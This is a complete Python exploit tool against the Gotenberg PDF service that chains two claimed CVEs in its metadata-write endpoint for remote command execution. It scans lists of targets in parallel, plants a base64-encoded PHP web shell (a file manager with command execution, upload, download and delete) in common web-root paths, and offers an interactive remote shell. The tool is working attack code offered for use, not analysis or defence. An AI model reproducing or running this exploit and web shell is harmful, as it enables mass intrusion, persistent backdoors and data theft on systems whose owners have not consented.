#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Gotenberg RCE Chain — CVE-2026-42589 + CVE-2026-40281
Interactive shell via RCE (blind-safe).

Usage:
  python gotenberg_rce.py -u http://target:3000              # auto: check + shell
  python gotenberg_rce.py -u http://target:3000 -i           # interactive
  python gotenberg_rce.py -u http://target:3000 --shell      # upload file manager
  python gotenberg_rce.py -f targets.txt --shell -t 20 -o results.txt
"""

import argparse
import base64
import json
import random
import re
import shutil
import string
import sys
import time
import zlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ────────────────────────────── CONSTANTS ───────────────────────────────
PDF_MINIMAL = b"""%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 100] >>
endobj
xref
0 4
0000000000 65535 f
0000000010 00000 n
0000000062 00000 n
0000000122 00000 n
trailer
<< /Size 4 /Root 1 0 R >>
startxref
196
%%EOF
"""

# ── File Manager PHP shell ──
SHELL_PHP = r'''<?php
@error_reporting(0);
@set_time_limit(0);
$CWD = isset($_GET['d']) ? $_GET['d'] : getcwd();
if (!is_dir($CWD)) $CWD = getcwd();
$CWD = realpath($CWD);

if (isset($_FILES['f']) && $_FILES['f']['error'] === UPLOAD_ERR_OK) {
    $dst = rtrim($CWD, '/') . '/' . basename($_FILES['f']['name']);
    if (move_uploaded_file($_FILES['f']['tmp_name'], $dst)) {
        echo "<div class='ok'>Uploaded: " . htmlspecialchars($dst) . "</div>";
    } else {
        echo "<div class='err'>Upload failed</div>";
    }
}
if (isset($_GET['del'])) {
    $p = $_GET['del'];
    if (is_file($p)) @unlink($p);
    elseif (is_dir($p)) @rmdir($p);
}
if (isset($_GET['dl']) && is_file($_GET['dl'])) {
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($_GET['dl']) . '"');
    readfile($_GET['dl']);
    exit;
}
$cmd_out = '';
if (isset($_POST['cmd']) && $_POST['cmd'] !== '') {
    $cmd_out = shell_exec($_POST['cmd'] . ' 2>&1');
}
$items = @scandir($CWD);
?>
<!doctype html>
<html><head><meta charset="utf-8"><title>File Manager</title>
<style>
body{font-family:monospace;background:#0b0b12;color:#ddd;margin:0;padding:20px}
h1{color:#8f7bff;font-size:18px;margin:0 0 10px}
.path{color:#9c9c9c;margin-bottom:12px}
a{color:#8f7bff;text-decoration:none}a:hover{text-decoration:underline}
table{border-collapse:collapse;width:100%}
th,td{padding:6px 10px;border-bottom:1px solid #1e1e2e;text-align:left}
th{color:#9c9c9c;font-weight:normal}
.bar{background:#14141e;padding:10px;border-radius:6px;margin-bottom:14px}
input[type=text],input[type=file]{background:#0b0b12;color:#ddd;border:1px solid #2a2a3a;padding:5px;border-radius:4px}
input[type=submit],button{background:#8f7bff;color:#fff;border:0;padding:6px 12px;border-radius:4px;cursor:pointer}
.ok{color:#6ee7a7}.err{color:#ff6b6b}
pre{background:#14141e;padding:10px;border-radius:6px;overflow:auto}
</style></head><body>
<h1>File Manager</h1>
<div class="path">📁 <?= htmlspecialchars($CWD) ?></div>
<div class="bar">
<form method="post" enctype="multipart/form-data" style="display:inline-block">
<input type="file" name="f"><input type="submit" value="⬆ Upload">
</form></div>
<div class="bar">
<form method="post" style="display:inline-block;width:100%">
<input type="text" name="cmd" placeholder="shell command..." style="width:70%">
<input type="submit" value="▶ Run"></form></div>
<?php if ($cmd_out !== ''): ?><pre><?= htmlspecialchars($cmd_out) ?></pre><?php endif; ?>
<table><tr><th>Name</th><th>Size</th><th>Action</th></tr>
<?php foreach ($items as $it):
  if ($it === '.' || $it === '..') {
    if ($it === '..' && $CWD !== '/') {
      echo "<tr><td><a href='?d=" . urlencode(dirname($CWD)) . "'>📁 ..</a></td><td>-</td><td>-</td></tr>";
    }
    continue;
  }
  $full = $CWD . '/' . $it;
  $is_dir = is_dir($full);
  $size = $is_dir ? '-' : number_format(filesize($full));
  $icon = $is_dir ? '📁' : '📄';
  $link = $is_dir ? "?d=" . urlencode($full) : "?dl=" . urlencode($full);
?>
<tr><td><a href="<?= $link ?>"><?= $icon ?> <?= htmlspecialchars($it) ?></a></td>
<td><?= $size ?></td>
<td><a href="?del=<?= urlencode($full) ?>" onclick="return confirm('Delete?')">🗑</a></td></tr>
<?php endforeach; ?></table></body></html>
'''

# ────────────────────────────── COLORS ──────────────────────────────────
class C:
    R = "\033[0m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YEL = "\033[93m"
    CYAN = "\033[96m"
    MAG = "\033[95m"
    BOLD = "\033[1m"


def log(msg, color=""):
    print(f"{color}{msg}{C.R}", flush=True)


# ────────────────────────────── HELPERS ─────────────────────────────────
def randstr(n=16):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def build_multipart(boundary, filename, metadata, pdf=PDF_MINIMAL):
    parts = [
        f"--{boundary}\r\n".encode(),
        f'Content-Disposition: form-data; name="files"; filename="{filename}.pdf"\r\n'.encode(),
        b"Content-Type: application/pdf\r\n\r\n",
        pdf,
        f"\r\n--{boundary}\r\n".encode(),
        b'Content-Disposition: form-data; name="metadata"\r\n\r\n',
        metadata.encode() if isinstance(metadata, str) else metadata,
        f"\r\n--{boundary}--\r\n".encode(),
    ]
    return b"".join(parts)


# ────────────────────────────── CVE-2026-40281 ──────────────────────────
def _build_40281(cmd, boundary, filename):
    sm = "ZXQ" + randstr(10) + "S"
    em = "ZXQ" + randstr(10) + "E"
    shell_line = (
        f"echo\\$IFS'{sm}';"
        f"({cmd})2>&1|base64;"
        f"echo\\$IFS'{em}'"
    )
    perl_expr = f"${{PDFVersion;$_=qx(\"{shell_line}\")}}"
    metadata = json.dumps({"Title": f"{filename}\n-Title<{perl_expr}>"})
    return build_multipart(boundary, filename, metadata), sm, em


def _iter_streams(content):
    yield content
    for m in re.finditer(rb"stream\r?\n", content):
        s = m.end()
        e = content.find(b"endstream", s)
        if e == -1:
            continue
        chunk = content[s:e].rstrip(b"\r\n")
        try:
            yield zlib.decompress(chunk)
        except Exception:
            continue


def _extract_between_markers(content, sm, em):
    smb = sm.encode() if isinstance(sm, str) else sm
    emb = em.encode() if isinstance(em, str) else em
    for buf in _iter_streams(content):
        i = buf.find(smb)
        if i == -1:
            continue
        j = buf.find(emb, i + len(smb))
        if j == -1:
            continue
        payload = re.sub(rb"[^A-Za-z0-9+/=]", b"", buf[i + len(smb):j])
        try:
            return base64.b64decode(payload).decode("utf-8", "replace")
        except Exception:
            continue
    return None


def exploit_40281(target, cmd, timeout=60):
    boundary = "----WebKitFormBoundary" + randstr(16)
    filename = randstr(12)
    body, sm, em = _build_40281(cmd, boundary, filename)
    url = target.rstrip("/") + "/forms/pdfengines/metadata/write"
    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "User-Agent": "Mozilla/5.0",
        "Accept": "*/*",
    }
    try:
        r = requests.post(url, data=body, headers=headers,
                          verify=False, timeout=timeout, allow_redirects=False)
    except requests.RequestException as e:
        return None, f"request error: {str(e)[:100]}"

    if r.status_code == 500:
        out = _extract_between_markers(r.content, sm, em)
        if out is not None:
            return out, None
        return None, "RCE_OK_BUT_NO_OUTPUT"

    if r.status_code != 200:
        return None, f"HTTP {r.status_code}"

    out = _extract_between_markers(r.content, sm, em)
    if out is None:
        return None, "marker not found in response"
    return out, None


# ────────────────────────────── CVE-2026-42589 ──────────────────────────
def exploit_42589(target, cmd, timeout=60):
    boundary = "----BoundaryCVE" + randstr(8)
    filename = randstr(10)
    sm = "S42589" + randstr(8) + "S"
    em = "S42589" + randstr(8) + "E"
    payload_cmd = f"echo {sm}; ({cmd}) 2>&1 | base64; echo {em}"
    metadata = (
        '{"Title\\n'
        '-if\\n'
        f"system('{payload_cmd}')||1"
        '\\n-Comment":"x"}'
    )
    body = build_multipart(boundary, filename, metadata)
    url = f"{target.rstrip('/')}/forms/pdfengines/metadata/write"
    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "User-Agent": "Mozilla/5.0",
        "Accept": "*/*",
    }
    try:
        r = requests.post(url, data=body, headers=headers,
                          verify=False, timeout=timeout, allow_redirects=False)
    except requests.RequestException as e:
        return None, f"request error: {str(e)[:100]}"

    if r.status_code == 500:
        out = _extract_between_markers(r.content, sm, em)
        if out is not None:
            return out, None
        return None, "RCE_OK_BUT_NO_OUTPUT"

    if r.status_code != 200:
        return None, f"HTTP {r.status_code}"

    out = _extract_between_markers(r.content, sm, em)
    if out is None:
        return None, "marker not found in response"
    return out, None


# ────────────────────────────── UNIFIED EXPLOIT ─────────────────────────
def exploit(target, cmd, timeout=60):
    out, err = exploit_40281(target, cmd, timeout)
    if out is not None:
        return out, "CVE-2026-40281", None
    err1 = err
    out, err = exploit_42589(target, cmd, timeout)
    if out is not None:
        return out, "CVE-2026-42589", None
    if err1 == "RCE_OK_BUT_NO_OUTPUT" or err == "RCE_OK_BUT_NO_OUTPUT":
        return None, "blind-500", "RCE_OK_BUT_NO_OUTPUT"
    return None, None, f"40281:{err1[:60]} | 42589:{err[:60]}"


# ────────────────────────────── RELIABLE CHECK ──────────────────────────
def check_target(target, timeout=20):
    marker = f"HACKFUT_{randstr(12)}"
    start = time.monotonic()
    out, engine, err = exploit(target, f"echo {marker}", timeout=timeout)
    elapsed = time.monotonic() - start

    if out and marker in out:
        return target, ("vulnerable", engine, elapsed), None

    if err == "RCE_OK_BUT_NO_OUTPUT" or (engine and "blind" in str(engine)):
        return target, ("vulnerable-blind-500", "blind", elapsed), None

    start = time.monotonic()
    _, _, _ = exploit(target, "sleep 8", timeout=timeout + 10)
    elapsed2 = time.monotonic() - start
    if elapsed2 >= 7.5:
        return target, ("vulnerable-blind", "blind", elapsed2), None

    if err:
        if "HTTP 400" in err:
            return target, None, "HTTP 400 — patché ou payload rejeté"
        if "HTTP 404" in err:
            return target, None, "HTTP 404 — endpoint introuvable"
        if "HTTP 500" in err:
            return target, None, "HTTP 500 — peut-être vuln, relancer"
        return target, None, err
    return target, None, f"pas de marqueur (elapsed={elapsed:.2f}s)"


# ────────────────────────────── INTERACTIVE SHELL ───────────────────────
def interactive_shell(target, engine):
    banner = f"""
{C.CYAN}┌──────────────────────────────────────────────────────────────┐
│  HFT404 Interactive Shell — {engine:<28}│
│  Target: {target:<50}│
└──────────────────────────────────────────────────────────────┘{C.R}

{C.YEL}[*] Tips:{C.R}
    • Type your commands below
    • Type 'exit' or 'quit' to leave
    • Type 'help' for available commands
    • Type '!upload' to deploy File Manager shell
"""
    print(banner)

    # Try to deploy shell first to have a real interactive
    shell_url = None
    print(f"{C.CYAN}[*] Attempting to deploy File Manager shell for real interactivity...{C.R}")
    results = write_shell(target, timeout=30)
    for dest, ok, url in results:
        if url:
            shell_url = url
            log(f"[+] File Manager shell deployed: {url}", C.GREEN)
            log(f"[+] Use it in your browser for full interactivity", C.GREEN)
            break
    if not shell_url:
        log("[!] Could not deploy shell — falling back to blind command mode", C.YEL)
        log("[!] Output will only be visible via timing side-channels", C.YEL)

    print()

    # ── Interactive loop ─────────────────────────────────────────────
    prompt = f"{C.GREEN}rOOt@HFT{C.R}:{C.CYAN}~{C.R}$ "     # ← CORRIGÉ

    while True:
        try:
            sys.stdout.write(prompt)
            sys.stdout.flush()
            line = sys.stdin.readline()
            if not line:
                print()
                break

            cmd = line.rstrip("\n")
            if not cmd.strip():
                continue

            # Meta-commands
            if cmd.strip().lower() in ("exit", "quit", "q"):
                break

            if cmd.strip().lower() in ("help", "?"):
                print(f"""
{C.CYAN}Available meta-commands:{C.R}
  help, ?           Show this help
  exit, quit, q     Quit the shell
  !upload           Re-deploy File Manager shell
  !shell            Show deployed shell URL
  !check            Re-check vulnerability status
  !clear            Clear screen

{C.CYAN}Anything else will be executed as a shell command on the target.{C.R}
""")
                continue

            if cmd.strip() == "!upload":
                log("[*] Re-deploying File Manager shell...", C.CYAN)
                results = write_shell(target, timeout=30)
                found = False
                for dest, ok, url in results:
                    if url:
                        shell_url = url
                        log(f"[+] Deployed: {url}", C.GREEN)
                        found = True
                        break
                if not found:
                    log("[-] Deployment failed", C.RED)
                continue

            if cmd.strip() == "!shell":
                if shell_url:
                    log(f"[*] Shell URL: {shell_url}", C.MAG)
                else:
                    log("[!] No shell deployed yet. Use !upload", C.YEL)
                continue

            if cmd.strip() == "!check":
                log("[*] Re-checking...", C.CYAN)
                result = check_target(target, timeout=20)
                log(f"[*] Result: {result[1] or result[2]}", C.CYAN)
                continue

            if cmd.strip() == "!clear":
                print("\033[2J\033[H", end="")
                continue

            # If we have a real shell URL, use it
            if shell_url:
                try:
                    r = requests.post(shell_url, data={"cmd": cmd},
                                      verify=False, timeout=30)
                    m = re.search(r"<pre>(.*?)</pre>", r.text, re.S)
                    if m:
                        output = m.group(1)
                        output = (output.replace("&lt;", "<").replace("&gt;", ">")
                                        .replace("&amp;", "&").replace("&quot;", '"'))
                        sys.stdout.write(output)
                        if not output.endswith("\n"):
                            sys.stdout.write("\n")
                    else:
                        log("[!] No output captured", C.YEL)
                except Exception as e:
                    log(f"[!] Request failed: {e}", C.RED)
                continue

            # Otherwise, blind mode
            log(f"[*] (blind) Running: {cmd}", C.CYAN)
            out, eng, err = exploit(target, cmd, timeout=30)

            if out:
                log(f"[+] Output:", C.GREEN)
                print(out)
            elif err == "RCE_OK_BUT_NO_OUTPUT":
                log(f"[+] Command executed (blind mode — no output captured)", C.GREEN)
                log(f"[*] Deploy the File Manager shell with '!upload' for real output", C.CYAN)
            else:
                log(f"[!] Error: {err}", C.RED)

        except (KeyboardInterrupt, EOFError):
            print()
            break
        except Exception as e:
            log(f"[!] {e}", C.RED)

    log("\n[*] Exiting interactive shell.", C.CYAN)


# ────────────────────────────── SHELL WRITE (BLIND-SAFE) ────────────────
def write_shell(target, timeout=30):
    b64 = base64.b64encode(SHELL_PHP.encode()).decode()
    fname = f"fm_{randstr(6)}.php"

    candidates = [
        f"/var/www/html/{fname}",
        f"/usr/share/nginx/html/{fname}",
        f"/app/public/{fname}",
        f"/var/www/{fname}",
        f"/opt/gotenberg/{fname}",
        f"/home/{fname}",
        f"/tmp/{fname}",
        f"/dev/shm/{fname}",
    ]

    results = []
    for dest in candidates:
        write_cmd = (
            f"python3 -c \"import base64;open('{dest}','wb')"
            f".write(base64.b64decode('{b64}'))\""
        )
        exploit(target, write_cmd, timeout)
        time.sleep(0.3)
        url = _verify_shell_http(target, dest, timeout)
        results.append((dest, True, url))
        if url:
            return results

    return results


def _verify_shell_http(target, path, timeout=10):
    base = target.rstrip("/")
    parsed = urlparse(base)
    host = parsed.hostname
    port = parsed.port or 3000
    candidates = [
        f"{base}{path}",
        f"http://{host}:{port}{path}",
        f"http://{host}{path}",
        f"https://{host}{path}",
        f"http://{host}:8080{path}",
        f"http://{host}:8000{path}",
        f"http://{host}:5000{path}",
    ]
    for url in candidates:
        try:
            r = requests.get(url, verify=False, timeout=timeout, allow_redirects=False)
            if r.status_code == 200 and "File Manager" in r.text:
                return url
        except Exception:
            continue
    return None


# ────────────────────────────── BANNER ──────────────────────────────────
def banner():
    try:
        w = shutil.get_terminal_size((120, 24)).columns
    except Exception:
        w = 120
    def ctr(t):
        return " " * max(0, (w - len(t)) // 2) + t

    print()
    print(C.CYAN + C.BOLD + ctr("╔═══════════════════════════════════════════════╗") + C.R)
    print(C.CYAN + C.BOLD + ctr("║      GOTENBERG RCE CHAIN  —  HACKFUT          ║") + C.R)
    print(C.CYAN + C.BOLD + ctr("╚═══════════════════════════════════════════════╝") + C.R)
    print(C.YEL + ctr("CVE-2026-42589  +  CVE-2026-40281") + C.R)
    print(C.GREEN + ctr("Post-exploitation: File Manager PHP shell + Interactive") + C.R)
    print()


# ────────────────────────────── MAIN ────────────────────────────────────
def main():
    ap = argparse.ArgumentParser(
        description="Gotenberg RCE + File Manager shell + Interactive"
    )
    ap.add_argument("-u", "--url", help="Single target")
    ap.add_argument("-f", "--file", help="File with targets")
    ap.add_argument("-t", "--threads", type=int, default=10)
    ap.add_argument("--timeout", type=int, default=60)
    ap.add_argument("--check-only", action="store_true")
    ap.add_argument("--shell", action="store_true",
                    help="Write the File Manager PHP shell")
    ap.add_argument("-i", "--interactive", action="store_true",
                    help="Drop into interactive shell after detection")
    ap.add_argument("-o", "--output", help="Save results")
    ap.add_argument("--no-banner", action="store_true")
    args = ap.parse_args()

    if not args.no_banner:
        banner()

    targets = []
    if args.url:
        targets.append(args.url)
    if args.file:
        try:
            with open(args.file, "r", encoding="utf-8", errors="ignore") as f:
                targets.extend(l.strip() for l in f if l.strip() and not l.startswith("#"))
        except FileNotFoundError:
            log(f"[!] File not found: {args.file}", C.RED)
            return 1

    if not targets:
        log("[!] Provide -u <target> or -f <file>", C.RED)
        return 1

    log(f"[*] Targets : {len(targets)}", C.CYAN)
    print()

    # ─── Scan ───
    log(f"[*] Scanning {len(targets)} target(s)...\n", C.CYAN)
    vulnerable = []
    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        futures = {ex.submit(check_target, t, args.timeout): t for t in targets}
        for fut in as_completed(futures):
            target, result, error = fut.result()
            if error:
                log(f"[-] {target:<45} {error}", C.YEL)
            elif result:
                kind, engine, elapsed = result
                if kind.startswith("vulnerable"):
                    log(f"[+] {target:<45} {kind.upper()} ({elapsed:.2f}s)", C.GREEN)
                    vulnerable.append((target, engine))

    log(f"\n[*] Vulnerable: {len(vulnerable)}/{len(targets)}\n", C.CYAN)

    if not vulnerable or args.check_only:
        if args.output and vulnerable:
            with open(args.output, "w") as f:
                for t, _ in vulnerable:
                    f.write(t + "\n")
        return 0

    # ─── Interactive (si demandé) ───
    if args.interactive:
        target, engine = vulnerable[0]
        interactive_shell(target, engine)
        return 0

    # ─── Shell write ───
    if args.shell:
        log(f"[*] Writing File Manager shell...\n", C.CYAN)
        shell_urls = []
        for target, engine in vulnerable:
            log(f"[*] Target: {target}", C.CYAN)
            results = write_shell(target, args.timeout)
            found = False
            for dest, ok, url in results:
                if url:
                    log(f"    [+] SUCCESS: {dest}", C.GREEN)
                    log(f"    [*] Shell URL: {url}", C.MAG)
                    shell_urls.append(url)
                    found = True
                    break
            if not found:
                log(f"    [-] no HTTP-accessible path found", C.YEL)

        if shell_urls and args.output:
            with open(args.output, "a", encoding="utf-8") as f:
                for u in shell_urls:
                    f.write(f"SHELL|{u}\n")
            log(f"\n[*] Shell URLs saved to: {args.output}", C.GREEN)

    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
        sys.exit(130)